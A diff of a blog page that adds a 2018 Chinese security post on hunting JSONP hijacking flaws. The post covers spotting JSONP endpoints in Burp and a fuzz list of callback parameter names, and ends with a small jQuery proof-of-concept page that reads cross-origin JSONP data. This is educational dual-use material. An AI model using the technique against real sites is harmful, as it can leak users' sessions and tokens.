@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        Yoki Security
+        浅谈jsonp劫持 · Yoki Security
         
     </title>
     <link rel="icon" href= /assets/favicon.ico>
@@ -58,6 +58,8 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
@@ -65,27 +67,71 @@
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
     
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >notyeat</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">浅谈jsonp劫持</a>
+            </div>
+    </div>
+    
     <a class="home-link" href=/>notyeat</a>
 </header>
     <div class="wrapper">
         <div class="site-intro">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(http://123.207.126.78/wallper.jpg)"></div>
     <div class="site-intro-placeholder"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
+            浅谈jsonp劫持
+            <!-- 404 -->
+            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = 漏洞挖掘>漏洞挖掘</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/08/03</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
         
     </div>
 </div>
@@ -153,49 +199,51 @@
             }
         </script>
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/26/php-unserialize/" >
-                
-                    <span>最通俗易懂的PHP反序列化分析</span>
-            </a>
-            <a class="content-show-full" href = "/2018/03/26/php-unserialize/" >
-                <div class="abstract-content">
-                    最通俗易懂的PHP反序列化分析0x00写在最最最前面文章首发在Freebuf，属FreeBuf原创奖励计划，未经许可禁止转载
-文章会慢慢优化，尽可能用最通俗的表达让大家明白一些知识点。
-0x01写在前面PHP反序列化漏洞虽然利用的条件比较苛刻，但是如果可以利用一般都会产生很严重的后果。在春招的时候很多公司都问过这个问题，说明这个反序列化漏洞的技能点也是很多公司比较关注的技能点。
-可是网上的文章基本讲得比较通俗，找了很久也没有找到一篇看完能让人醍醐灌顶的文章。所以想想就自己来总结一篇吧，我觉得要了解PHP反序列化漏洞，应该从这几方面：
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>jsop，其实很早以前就被人玩烂了，但是我一直没有重视，感觉顶多泄露点个人信息，直到这个星期，挖到一个jsonp泄露session的漏洞</p>
+<p>这个星期测了个在线教育的站，域名有很多个，不同域名下的访问就会产生一个跨域的问题，跨域的解决方案一般有三种 CORS、postMessage和jsonp。这里jsonp的原理就不细讲了。</p>
+<p>那个网站登陆页面在域名A,登陆认证的后端在域名B，当登陆成功之后域名A有时就会请求域名B接口获取session</p>
+<p>其实原理没什么好讲的，讲这个主要是提醒自己不要小看一些漏洞，像jsonp劫持最多的危害就是泄露敏感信息，比如用户信息、token之类的。</p>
+<h2 id="jsonp原理"><a href="#jsonp原理" class="headerlink" title="jsonp原理"></a>jsonp原理</h2><p>懒得写了，先占个坑以后补</p>
+<h2 id="挖掘jsonp劫持漏洞"><a href="#挖掘jsonp劫持漏洞" class="headerlink" title="挖掘jsonp劫持漏洞"></a>挖掘jsonp劫持漏洞</h2><p>有很多程序员在写接口的时候都会顺手写个jsonp的接口，可以先开着bp看一下功能点，看看是否有地方用了jsonp</p>
+<h3 id="快速寻找jsonp的接口"><a href="#快速寻找jsonp的接口" class="headerlink" title="快速寻找jsonp的接口"></a>快速寻找jsonp的接口</h3><p>开着bp逛一圈，一般有jsonp的数据传输会在mimetype中显示为script，通过排序可以快速得找到<br><img src="1.png" alt=""></p>
+<p>callback的值，就是jsonp回传回来的函数名</p>
+<p><img src="2.png" alt=""></p>
+<p>然后只要查看传输的数据中是否有敏感信息就可以了</p>
+<h3 id="寻找敏感的json数据"><a href="#寻找敏感的json数据" class="headerlink" title="寻找敏感的json数据"></a>寻找敏感的json数据</h3><p>如果jsonp的接口没有敏感信息传输，json数据包中恰好有的话，我们可以尝试一下程序员是否有开发jsonp的格式，大多数程序员喜欢把jsonp的回传参数命名为callback</p>
+<p>当然还有其他的可能，贴一份字典，直接用Intruder Fuzz一下试试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">callback=attack</span><br><span class="line">cb=attack</span><br><span class="line">call=attack</span><br><span class="line">jsonp=attack</span><br><span class="line">jsonpcallback=attack</span><br><span class="line">jsonpcb=attack</span><br><span class="line">json=attack</span><br><span class="line">jsoncallback=attack</span><br><span class="line">jcb=attack</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h2><p>如果最后爆破成功的接口为<code>http://47.98.109.141:5000/interface?callback=attack</code><br>返回的数据为<br><code>attack({&quot;value&quot;:1})</code><br>使用下面的poc<br>jsonp 填写回调参数的名字<br>jsonpcallback就是回调参数的值<br>alert的地方根据需要更改取值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;jsonp劫持&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&quot;http://xxx.com/interface&quot;,</span><br><span class="line">        dataType:&quot;jsonp&quot;,</span><br><span class="line">        jsonp:&quot;callback&quot;,</span><br><span class="line">        jsonpCallback:&quot;attack&quot;,</span><br><span class="line">        success:function (data) &#123;</span><br><span class="line">            alert(data.value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如果能正常取到值，就说明漏洞存在了</p>
+<p>漏洞利用的话就具体情况具体分析了，这里就不赘述了</p>
 
-什么是反序列化
-为什么会产生这个漏洞
-在编程的过程中...
-                </div>
-            </a>
-            <div class="abstract-post-meta">
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2018/07/31/vuln-1/" title= 漏洞挖掘：越权获取任意用户的session >
+                    <span>Previous Post</span>
+                    <span>漏洞挖掘：越权获取任意用户的session</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        <a class="post-tag" href="javascript:void(0);" data-href = php>php</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-href = 代码审计>代码审计</a>
+    <!--PC版-->
+
+    <!--PC版-->
+
+
     
-        <a class="post-tag" href="javascript:void(0);" data-href = unserialize>unserialize</a>
-    
-</div>
-                
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer"></span><span class="abstract-time">2018/03/26</span>
-                </div>
-            </div>
-        </article>
-    
-    <!-- paginator  -->
-    
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -241,6 +289,13 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp原理"><span class="toc-number">2.</span> <span class="toc-text">jsonp原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#挖掘jsonp劫持漏洞"><span class="toc-number">3.</span> <span class="toc-text">挖掘jsonp劫持漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#快速寻找jsonp的接口"><span class="toc-number">3.1.</span> <span class="toc-text">快速寻找jsonp的接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找敏感的json数据"><span class="toc-number">3.2.</span> <span class="toc-text">寻找敏感的json数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞证明"><span class="toc-number">4.</span> <span class="toc-text">漏洞证明</span></a></li></ol>
+    </div>
     
     <div class="back-top">&#xe639;</div>
     <div class="sidebar">
